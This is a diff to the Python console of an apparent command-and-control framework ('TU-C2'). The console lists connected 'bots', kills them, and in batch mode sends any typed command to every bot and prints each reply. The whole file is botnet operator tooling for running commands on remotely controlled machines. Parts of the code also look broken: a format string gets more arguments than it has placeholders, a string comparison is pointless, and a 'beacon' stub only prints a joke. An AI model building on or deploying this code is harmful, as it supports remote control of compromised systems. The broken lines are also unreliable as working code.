@@ -21,7 +21,7 @@ class Interpreter(threading.Thread):
 
             # PRINT ALL AVAILABLE COMMANDS AND FUNCTIONS HERE
             
-            cmd = str(input("[TU-C2:CONSOLE]$ ")).casefold()
+            cmd = str(input("[TU-C2:CONSOLE]$ "))
 
             # TODO:
             # commands:
@@ -33,17 +33,18 @@ class Interpreter(threading.Thread):
             #   - usage-info^^^
 
 
-            if (cmd == ""):
+            if (cmd == "".strip(" ")):
                 print("[* Interpreter-Msg] Error: No command received. Try again...")
                 pass
-            elif (cmd == "exit"):
+            elif (cmd.strip(" ") == "exit"):
                 self.exit()
-            elif (cmd == "clear"):
+            elif (cmd.strip(" ") == "clear"):
                 os.system("clear")            
-            elif (cmd == "list-agents"):
+            elif (cmd.strip(" ") == "list-agents"):
                 self.listAgents()
-            elif (cmd == "batch-mode"):
+            elif (cmd.strip(" ") == "batch-mode"):
                 self.batchMode()
+
             elif (cmd.startswith("kill")):
                 try:
                     print(cmd)
@@ -96,7 +97,7 @@ class Interpreter(threading.Thread):
         bm_entry = ''
 
         # This loop is super shitty, fix it 
-        while ('quit'.casefold() not in bm_entry):
+        while ('quit'.casefold().strip(" ") not in bm_entry):
             if(bm_success):
                 break
             else:    
@@ -114,8 +115,7 @@ class Interpreter(threading.Thread):
                             batchList.append(conn)
                     bm_success = True
 
-
-        time.sleep(1)
+        time.sleep(0.3)
 
         if(bm_success):
             os.system("clear")
@@ -130,22 +130,23 @@ class Interpreter(threading.Thread):
             while (True):
                 batch_cmd = str(input("[TU-C2:BATCH-CMD]% "))
                 
-                if(batch_cmd.casefold() == "quit" or batch_cmd.casefold() == "q"):
+                if(batch_cmd.casefold().strip(" ") == "quit" or batch_cmd.casefold().strip(" ") == "q"):
                     batchList.clear()
                     break
-                elif (batch_cmd.casefold() == "exit"):
+                elif (batch_cmd.casefold().strip(" ") == "exit"):
                     batchList.clear()
                     self.exit()
-                elif (batch_cmd.casefold() == "shell"):
+                elif (batch_cmd.casefold().strip(" ") == "shell"):
                     print("[* Interpreter-Msg] Can't interact with individual shells in this environment")
                     print("[* Interpreter-Msg] Please exit if that is the desired result\n")
                     continue
+                elif (batch_cmd.casefold().strip(" ") == "clear"):
+                    os.system("clear")
                 else:
                     try:
                         print(f"[+] Sending Command: {batch_cmd} to {str(len(batchList))} bots")
                         for conn in batchList:                                     
                             time.sleep(0.1)
-                            print  
                             print(f"[* BATCH-CMD] Bot #{conn.getID()} response: ")
                             print(conn.execute(batch_cmd))
                     except Exception as ex:
@@ -164,6 +165,7 @@ class Interpreter(threading.Thread):
         print("[* Interpreter-Msg] Exiting connections for all bots. Please wait...")
         time.sleep(5)
         os._exit(0)
+
 #------------------------------------------------------------------------------------------------------------------------------
     def listAgents(self): # Change to listAlive(self)
         print("       .------------------.                                    ")
@@ -173,7 +175,7 @@ class Interpreter(threading.Thread):
         print(":------:------------------:-------:-------------:-------------:")
 
         for agent in self.agentList:
-            print("| %4d | %16s | %5d | %6s |"% (agent.getID(), agent.getIP(), agent.getPort(), agent.getStatus()))
+            print("| %4d | %16s | %5d | %6s |"% (agent.getID(), agent.getIP(), agent.getPort(), agent.ping(), agent.beacon()))
             print(":------:------------------:-------:--------:")
 #------------------------------------------------------------------------------------------------------------------------------
     def interact(self, id):
@@ -208,4 +210,8 @@ class Interpreter(threading.Thread):
         else:
             print(f"[* Interpreter-Msg] Bot #{id} was killed with errors...\n")
 #------------------------------------------------------------------------------------------------------------------------------
+
+    def beacon(self, id):
+        print("hi i'z beekan")
+
 
